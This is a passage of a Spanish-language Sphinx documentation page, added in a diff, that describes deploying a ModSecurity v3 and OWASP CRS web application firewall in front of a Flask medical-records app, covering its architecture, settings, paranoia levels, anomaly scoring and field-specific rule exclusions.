@@ -1,0 +1,970 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="../">
+  <head><meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="index" title="Index" href="../genindex.html"><link rel="search" title="Search" href="../search.html">
+
+    <!-- Generated with Sphinx 8.1.3 and Furo 2025.12.19 -->
+        <title>WAF: ModSecurity v3 + OWASP Core Rule Set (CRS) - Medical Register 0.1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=d111a655" />
+    <link rel="stylesheet" type="text/css" href="../_static/styles/furo.css?v=7bdb33bb" />
+    <link rel="stylesheet" type="text/css" href="../_static/styles/furo-extensions.css?v=8dab3a3b" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f2f2f2;
+  --color-code-foreground: #1e1e1e;
+  --color-brand-primary: #254F6D;
+  --color-brand-content: #254F6D;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-with-moon" viewBox="0 0 24 24">
+    <title>Auto light/dark, in light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1" stroke-linecap="round" stroke-linejoin="round"
+      class="icon-custom-derived-from-feather-sun-and-tabler-moon">
+      <path style="opacity: 50%" d="M 5.411 14.504 C 5.471 14.504 5.532 14.504 5.591 14.504 C 3.639 16.319 4.383 19.569 6.931 20.352 C 7.693 20.586 8.512 20.551 9.25 20.252 C 8.023 23.207 4.056 23.725 2.11 21.184 C 0.166 18.642 1.702 14.949 4.874 14.536 C 5.051 14.512 5.231 14.5 5.411 14.5 L 5.411 14.504 Z"/>
+      <line x1="14.5" y1="3.25" x2="14.5" y2="1.25"/>
+      <line x1="14.5" y1="15.85" x2="14.5" y2="17.85"/>
+      <line x1="10.044" y1="5.094" x2="8.63" y2="3.68"/>
+      <line x1="19" y1="14.05" x2="20.414" y2="15.464"/>
+      <line x1="8.2" y1="9.55" x2="6.2" y2="9.55"/>
+      <line x1="20.8" y1="9.55" x2="22.8" y2="9.55"/>
+      <line x1="10.044" y1="14.006" x2="8.63" y2="15.42"/>
+      <line x1="19" y1="5.05" x2="20.414" y2="3.636"/>
+      <circle cx="14.5" cy="9.55" r="3.6"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon-with-sun" viewBox="0 0 24 24">
+    <title>Auto light/dark, in dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1" stroke-linecap="round" stroke-linejoin="round"
+      class="icon-custom-derived-from-feather-sun-and-tabler-moon">
+      <path d="M 8.282 7.007 C 8.385 7.007 8.494 7.007 8.595 7.007 C 5.18 10.184 6.481 15.869 10.942 17.24 C 12.275 17.648 13.706 17.589 15 17.066 C 12.851 22.236 5.91 23.143 2.505 18.696 C -0.897 14.249 1.791 7.786 7.342 7.063 C 7.652 7.021 7.965 7 8.282 7 L 8.282 7.007 Z"/>
+      <line style="opacity: 50%" x1="18" y1="3.705" x2="18" y2="2.5"/>
+      <line style="opacity: 50%" x1="18" y1="11.295" x2="18" y2="12.5"/>
+      <line style="opacity: 50%" x1="15.316" y1="4.816" x2="14.464" y2="3.964"/>
+      <line style="opacity: 50%" x1="20.711" y1="10.212" x2="21.563" y2="11.063"/>
+      <line style="opacity: 50%" x1="14.205" y1="7.5" x2="13.001" y2="7.5"/>
+      <line style="opacity: 50%" x1="21.795" y1="7.5" x2="23" y2="7.5"/>
+      <line style="opacity: 50%" x1="15.316" y1="10.184" x2="14.464" y2="11.036"/>
+      <line style="opacity: 50%" x1="20.711" y1="4.789" x2="21.563" y2="3.937"/>
+      <circle style="opacity: 50%" cx="18" cy="7.5" r="2.169"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-pencil" viewBox="0 0 24 24">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-pencil-code">
+      <path d="M4 20h4l10.5 -10.5a2.828 2.828 0 1 0 -4 -4l-10.5 10.5v4" />
+      <path d="M13.5 6.5l4 4" />
+      <path d="M20 21l2 -2l-2 -2" />
+      <path d="M17 17l-2 2l2 2" />
+    </svg>
+  </symbol>
+  <symbol id="svg-eye" viewBox="0 0 24 24">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-eye-code">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" />
+      <path
+        d="M11.11 17.958c-3.209 -.307 -5.91 -2.293 -8.11 -5.958c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6c-.21 .352 -.427 .688 -.647 1.008" />
+      <path d="M20 21l2 -2l-2 -2" />
+      <path d="M17 17l-2 2l2 2" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle site navigation sidebar">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc" aria-label="Toggle table of contents sidebar">
+<label class="overlay sidebar-overlay" for="__navigation"></label>
+<label class="overlay toc-overlay" for="__toc"></label>
+
+<a class="skip-to-content muted-link" href="#furo-main-content">Skip to content</a>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <span class="icon"><svg><use href="#svg-menu"></use></svg></span>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../index.html"><div class="brand">Medical Register 0.1.0 documentation</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle" aria-label="Toggle Light / Dark / Auto color theme">
+          <svg class="theme-icon-when-auto-light"><use href="#svg-sun-with-moon"></use></svg>
+          <svg class="theme-icon-when-auto-dark"><use href="#svg-moon-with-sun"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <span class="icon"><svg><use href="#svg-toc"></use></svg></span>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../index.html">
+  
+  
+</a><form class="sidebar-search-container" method="get" action="../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contenido:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../manual.html">Manual de Usuario - Registro Personal de Peso e IMC</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../requeriments.html">Requerimientos Funcionales</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../INFORME_SEGURIDAD.html">Informe de Análisis de Seguridad - Aplicación Médica</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../INICIO_RAPIDO.html">Inicio Rápido</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../mockups/MOCKUPS.html">Mockups y Diagramas</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">DefectDojo:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/ANALISIS_CWE_699.html">Análisis de Seguridad según CWE-699</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/ESTADO_ACTUAL_CWE_699.html">Estado Actual del Programa - Análisis CWE-699</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_CONFIGURACION.html">Configuración de DefectDojo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_CREDENTIALS.html">Credenciales de DefectDojo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_DATABASE.html">Gestión de Base de Datos de DefectDojo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_INTEGRATION.html">Integración de DefectDojo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_FLUJO_CREACION_RESOLUCION.html">Flujo de Creación y Resolución de Findings en DefectDojo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_FLUJO_IMPLEMENTADO.html">Flujo de Creación → Resolución Implementado en DefectDojo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defectdojo/MAKE_ALL_USO.html">Uso de <code class="docutils literal notranslate"><span class="pre">make</span> <span class="pre">update</span></code> - Flujo Completo de DefectDojo</a></li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          <div class="view-this-page">
+  <a class="muted-link" href="../_sources/seguridad/06-waf-modsecurity.md.txt" title="View this page">
+    <svg><use href="#svg-eye"></use></svg>
+    <span class="visually-hidden">View this page</span>
+  </a>
+</div>
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle" aria-label="Toggle Light / Dark / Auto color theme">
+              <svg class="theme-icon-when-auto-light"><use href="#svg-sun-with-moon"></use></svg>
+              <svg class="theme-icon-when-auto-dark"><use href="#svg-moon-with-sun"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <span class="icon"><svg><use href="#svg-toc"></use></svg></span>
+          </label>
+        </div>
+        <article role="main" id="furo-main-content">
+          <section id="waf-modsecurity-v3-owasp-core-rule-set-crs">
+<h1>WAF: ModSecurity v3 + OWASP Core Rule Set (CRS)<a class="headerlink" href="#waf-modsecurity-v3-owasp-core-rule-set-crs" title="Link to this heading">¶</a></h1>
+<section id="que-es-y-por-que-se-usa">
+<h2>Qué es y por qué se usa<a class="headerlink" href="#que-es-y-por-que-se-usa" title="Link to this heading">¶</a></h2>
+<p>Un <strong>WAF (Web Application Firewall)</strong> es un cortafuegos de aplicación que inspecciona el tráfico HTTP en busca de patrones maliciosos antes de que las peticiones lleguen al backend. A diferencia de un firewall de red (capas 3-4), un WAF opera en la capa 7 (aplicación) y puede analizar el contenido de las peticiones: cabeceras, query strings, cuerpos JSON/formulario, cookies, etc.</p>
+<p>En esta aplicación se despliega <strong>ModSecurity v3</strong> (motor WAF open source, mantenido por Trustwave/OWASP) junto con el <strong>OWASP Core Rule Set (CRS)</strong>, el conjunto de reglas estándar de la industria que cubre las categorías de ataques más comunes (OWASP Top 10).</p>
+<section id="que-aporta-a-la-aplicacion">
+<h3>Qué aporta a la aplicación<a class="headerlink" href="#que-aporta-a-la-aplicacion" title="Link to this heading">¶</a></h3>
+<ul class="simple">
+<li><p><strong>Defensa en profundidad</strong>: las validaciones de entrada del backend (<code class="docutils literal notranslate"><span class="pre">app/helpers.py</span></code>) protegen contra datos malformados; el WAF actúa como <strong>capa adicional</strong> que bloquea ataques conocidos antes de que lleguen al código de la aplicación.</p></li>
+<li><p><strong>Protección contra ataques genéricos</strong>: SQL injection, XSS, path traversal, command injection, scanners automatizados, etc.</p></li>
+<li><p><strong>Sin cambios en el código</strong>: el WAF se despliega como reverse proxy delante del backend; la aplicación Flask no necesita modificaciones.</p></li>
+<li><p><strong>Ocultación del backend</strong>: el usuario se conecta al WAF (Nginx); el backend Flask no es accesible directamente desde fuera de la red Docker.</p></li>
+</ul>
+</section>
+</section>
+<hr class="docutils" />
+<section id="arquitectura">
+<h2>Arquitectura<a class="headerlink" href="#arquitectura" title="Link to this heading">¶</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                    ┌──────────────────────────────────────────────┐
+                    │              Red Docker (proxy-network)       │
+                    │                                              │
+ Usuario :5001 ──▶  │  WAF (Nginx + ModSecurity + CRS)  ──▶  Flask │
+                    │  owasp/modsecurity-crs:nginx-alpine    :5001 │
+                    │  contenedor: waf_modsecurity            web   │
+                    │                                              │
+                    └──────────────────────────────────────────────┘
+</pre></div>
+</div>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Componente</p></th>
+<th class="head"><p>Detalle</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><strong>Imagen Docker</strong></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">owasp/modsecurity-crs:nginx-alpine</span></code> (imagen oficial OWASP)</p></td>
+</tr>
+<tr class="row-odd"><td><p><strong>Contenedor</strong></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">waf_modsecurity</span></code></p></td>
+</tr>
+<tr class="row-even"><td><p><strong>Puerto expuesto</strong></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">5001</span></code> (host) → <code class="docutils literal notranslate"><span class="pre">8080</span></code> (contenedor WAF)</p></td>
+</tr>
+<tr class="row-odd"><td><p><strong>Backend</strong></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">http://web:5001</span></code> (solo accesible dentro de la red Docker)</p></td>
+</tr>
+<tr class="row-even"><td><p><strong>Arranque</strong></p></td>
+<td><p>Automático con <code class="docutils literal notranslate"><span class="pre">make</span></code> o <code class="docutils literal notranslate"><span class="pre">docker-compose</span> <span class="pre">up</span> <span class="pre">-d</span></code>. No requiere perfil.</p></td>
+</tr>
+<tr class="row-odd"><td><p><strong>Dependencia</strong></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">depends_on:</span> <span class="pre">web:</span> <span class="pre">condition:</span> <span class="pre">service_healthy</span></code> — el WAF espera a que Flask esté sano antes de aceptar tráfico.</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>El servicio <code class="docutils literal notranslate"><span class="pre">web</span></code> (Flask/Gunicorn) usa <code class="docutils literal notranslate"><span class="pre">expose:</span> <span class="pre">&quot;5001&quot;</span></code> en lugar de <code class="docutils literal notranslate"><span class="pre">ports</span></code>, por lo que <strong>no publica</strong> su puerto en el host. Toda petición del usuario pasa obligatoriamente por el WAF.</p>
+</section>
+<hr class="docutils" />
+<section id="configuracion">
+<h2>Configuración<a class="headerlink" href="#configuracion" title="Link to this heading">¶</a></h2>
+<p>Las variables de entorno del contenedor WAF se definen en <code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> → servicio <code class="docutils literal notranslate"><span class="pre">waf</span></code>:</p>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Variable</p></th>
+<th class="head"><p>Valor</p></th>
+<th class="head"><p>Descripción</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">BACKEND</span></code></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">http://web:5001</span></code></p></td>
+<td><p>URL interna del backend Flask al que el WAF reenvía las peticiones limpias</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">MODSEC_RULE_ENGINE</span></code></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">On</span></code></p></td>
+<td><p>Modo de operación de ModSecurity: <code class="docutils literal notranslate"><span class="pre">On</span></code> bloquea las peticiones que coinciden con reglas; <code class="docutils literal notranslate"><span class="pre">DetectionOnly</span></code> solo las registra sin bloquear (útil para pruebas iniciales)</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">PARANOIA</span></code></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">1</span></code></p></td>
+<td><p>Paranoia Level del OWASP CRS (ver sección siguiente)</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">ANOMALY_INBOUND</span></code></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">5</span></code></p></td>
+<td><p>Umbral de puntuación de anomalía para peticiones entrantes. Una petición se bloquea cuando la suma de scores de las reglas que activa iguala o supera este umbral</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">ANOMALY_OUTBOUND</span></code></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">4</span></code></p></td>
+<td><p>Umbral de puntuación de anomalía para respuestas salientes</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">ALLOWED_METHODS</span></code></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">GET</span> <span class="pre">HEAD</span> <span class="pre">POST</span> <span class="pre">OPTIONS</span> <span class="pre">PUT</span> <span class="pre">DELETE</span></code></p></td>
+<td><p>Métodos HTTP permitidos; el resto se bloquea</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">ALLOWED_REQUEST_CONTENT_TYPE</span></code></p></td>
+<td><p><code class="docutils literal notranslate"><span class="pre">application/json</span></code>, <code class="docutils literal notranslate"><span class="pre">multipart/form-data</span></code>, etc.</p></td>
+<td><p>Content-Types permitidos. Incluye <code class="docutils literal notranslate"><span class="pre">application/json</span></code> (necesario para la API REST)</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+<section id="paranoia-level-pl">
+<h3>Paranoia Level (PL)<a class="headerlink" href="#paranoia-level-pl" title="Link to this heading">¶</a></h3>
+<p>El OWASP CRS organiza sus reglas en 4 niveles de paranoia:</p>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>PL</p></th>
+<th class="head"><p>Descripción</p></th>
+<th class="head"><p>Falsos positivos</p></th>
+<th class="head"><p>Uso recomendado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><strong>1</strong></p></td>
+<td><p>Solo reglas de alta confianza. Mínimos falsos positivos.</p></td>
+<td><p>Muy bajo</p></td>
+<td><p><strong>Producción general</strong> (valor actual)</p></td>
+</tr>
+<tr class="row-odd"><td><p>2</p></td>
+<td><p>Reglas adicionales de confianza media.</p></td>
+<td><p>Bajo-medio</p></td>
+<td><p>Aplicaciones con datos sensibles y tiempo para ajustar exclusiones</p></td>
+</tr>
+<tr class="row-even"><td><p>3</p></td>
+<td><p>Reglas agresivas; muchos patrones detectados.</p></td>
+<td><p>Medio-alto</p></td>
+<td><p>Entornos de alta seguridad con exclusiones bien ajustadas</p></td>
+</tr>
+<tr class="row-odd"><td><p>4</p></td>
+<td><p>Máxima detección; bloquea casi cualquier patrón sospechoso.</p></td>
+<td><p>Muy alto</p></td>
+<td><p>Solo para pruebas o entornos muy controlados</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Se usa <strong>PL 1</strong> porque proporciona buena cobertura contra las categorías de ataques más comunes con un riesgo muy bajo de bloquear peticiones legítimas. Si se sube el PL, es necesario ampliar las exclusiones para evitar falsos positivos.</p>
+</section>
+<section id="anomaly-scoring">
+<h3>Anomaly Scoring<a class="headerlink" href="#anomaly-scoring" title="Link to this heading">¶</a></h3>
+<p>ModSecurity CRS usa un modelo de <strong>anomaly scoring</strong>: cada regla que se activa suma puntos a un contador. La petición se bloquea solo cuando el total acumulado alcanza el umbral configurado.</p>
+<ul class="simple">
+<li><p><strong>Inbound (5)</strong>: una sola regla crítica (SQL injection, XSS) normalmente suma 5 puntos, lo que bloquea inmediatamente la petición. Dos reglas de severidad menor (2+3) también alcanzan el umbral.</p></li>
+<li><p><strong>Outbound (4)</strong>: protege contra fugas de información en las respuestas (errores SQL, stack traces, etc.).</p></li>
+</ul>
+</section>
+</section>
+<hr class="docutils" />
+<section id="exclusiones-para-falsos-positivos">
+<h2>Exclusiones para falsos positivos<a class="headerlink" href="#exclusiones-para-falsos-positivos" title="Link to this heading">¶</a></h2>
+<p>Fichero: <strong><code class="docutils literal notranslate"><span class="pre">waf/modsecurity-override.conf</span></code></strong></p>
+<p>Este fichero se monta como regla <strong>AFTER-CRS</strong> (se ejecuta después de cargar todas las reglas del Core Rule Set). Contiene exclusiones específicas para los campos y rutas de la aplicación que disparan falsos positivos.</p>
+<section id="regla-10001-campo-password-en-rutas-de-autenticacion">
+<h3>Regla 10001 — Campo <code class="docutils literal notranslate"><span class="pre">password</span></code> en rutas de autenticación<a class="headerlink" href="#regla-10001-campo-password-en-rutas-de-autenticacion" title="Link to this heading">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>SecRule REQUEST_URI &quot;@beginsWith /api/auth/&quot;
+    ctl:ruleRemoveTargetById=941100-941999;ARGS:password   ← XSS
+    ctl:ruleRemoveTargetById=942100-942999;ARGS:password   ← SQLi
+    ctl:ruleRemoveTargetById=920272;ARGS:password          ← Tamaño
+</pre></div>
+</div>
+<p><strong>Motivo</strong>: las contraseñas pueden contener caracteres como <code class="docutils literal notranslate"><span class="pre">'</span></code>, <code class="docutils literal notranslate"><span class="pre">&quot;</span></code>, <code class="docutils literal notranslate"><span class="pre">&lt;</span></code>, <code class="docutils literal notranslate"><span class="pre">&gt;</span></code>, <code class="docutils literal notranslate"><span class="pre">--</span></code>, <code class="docutils literal notranslate"><span class="pre">OR</span></code>, etc., que disparan reglas de inyección SQL y XSS. La exclusión se aplica <strong>solo</strong> al campo <code class="docutils literal notranslate"><span class="pre">password</span></code> y <strong>solo</strong> en las rutas <code class="docutils literal notranslate"><span class="pre">/api/auth/*</span></code>.</p>
+</section>
+<section id="regla-10002-campo-recaptcha-token-en-rutas-de-autenticacion">
+<h3>Regla 10002 — Campo <code class="docutils literal notranslate"><span class="pre">recaptcha_token</span></code> en rutas de autenticación<a class="headerlink" href="#regla-10002-campo-recaptcha-token-en-rutas-de-autenticacion" title="Link to this heading">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SecRule</span> <span class="n">REQUEST_URI</span> <span class="s2">&quot;@beginsWith /api/auth/&quot;</span>
+    <span class="n">ctl</span><span class="p">:</span><span class="n">ruleRemoveTargetById</span><span class="o">=</span><span class="mi">941100</span><span class="o">-</span><span class="mi">941999</span><span class="p">;</span><span class="n">ARGS</span><span class="p">:</span><span class="n">recaptcha_token</span>
+    <span class="n">ctl</span><span class="p">:</span><span class="n">ruleRemoveTargetById</span><span class="o">=</span><span class="mi">942100</span><span class="o">-</span><span class="mi">942999</span><span class="p">;</span><span class="n">ARGS</span><span class="p">:</span><span class="n">recaptcha_token</span>
+</pre></div>
+</div>
+<p><strong>Motivo</strong>: el token reCAPTCHA v3 es una cadena base64 larga que puede contener secuencias que coinciden con patrones de inyección.</p>
+</section>
+<section id="regla-10003-campos-de-nombre-en-ruta-de-perfil">
+<h3>Regla 10003 — Campos de nombre en ruta de perfil<a class="headerlink" href="#regla-10003-campos-de-nombre-en-ruta-de-perfil" title="Link to this heading">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SecRule</span> <span class="n">REQUEST_URI</span> <span class="s2">&quot;@beginsWith /api/user&quot;</span>
+    <span class="n">ctl</span><span class="p">:</span><span class="n">ruleRemoveTargetById</span><span class="o">=</span><span class="mi">941100</span><span class="o">-</span><span class="mi">941999</span><span class="p">;</span><span class="n">ARGS</span><span class="p">:</span><span class="n">first_name</span>
+    <span class="n">ctl</span><span class="p">:</span><span class="n">ruleRemoveTargetById</span><span class="o">=</span><span class="mi">941100</span><span class="o">-</span><span class="mi">941999</span><span class="p">;</span><span class="n">ARGS</span><span class="p">:</span><span class="n">last_name</span>
+    <span class="n">ctl</span><span class="p">:</span><span class="n">ruleRemoveTargetById</span><span class="o">=</span><span class="mi">942100</span><span class="o">-</span><span class="mi">942999</span><span class="p">;</span><span class="n">ARGS</span><span class="p">:</span><span class="n">first_name</span>
+    <span class="n">ctl</span><span class="p">:</span><span class="n">ruleRemoveTargetById</span><span class="o">=</span><span class="mi">942100</span><span class="o">-</span><span class="mi">942999</span><span class="p">;</span><span class="n">ARGS</span><span class="p">:</span><span class="n">last_name</span>
+</pre></div>
+</div>
+<p><strong>Motivo</strong>: los nombres pueden contener caracteres Unicode, acentos, apóstrofes (O’Brien) y guiones que activan reglas de inyección.</p>
+</section>
+<section id="regla-10004-dashboard-supervisor-solo-desarrollo">
+<h3>Regla 10004 — Dashboard Supervisor (solo desarrollo)<a class="headerlink" href="#regla-10004-dashboard-supervisor-solo-desarrollo" title="Link to this heading">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SecRule</span> <span class="n">REQUEST_URI</span> <span class="s2">&quot;@beginsWith /supervisor&quot;</span>
+    <span class="n">ctl</span><span class="p">:</span><span class="n">ruleEngine</span><span class="o">=</span><span class="n">Off</span>
+</pre></div>
+</div>
+<p><strong>Motivo</strong>: el supervisor es un dashboard interno de desarrollo que genera tráfico con patrones que activarían múltiples reglas. Se desactiva completamente el motor de reglas para esta ruta. <strong>En producción, el supervisor debe estar desactivado</strong> (<code class="docutils literal notranslate"><span class="pre">APP_SUPERVISOR=0</span></code>).</p>
+</section>
+<section id="secresponsebodyaccess-off">
+<h3>SecResponseBodyAccess Off<a class="headerlink" href="#secresponsebodyaccess-off" title="Link to this heading">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SecResponseBodyAccess</span> <span class="n">Off</span>
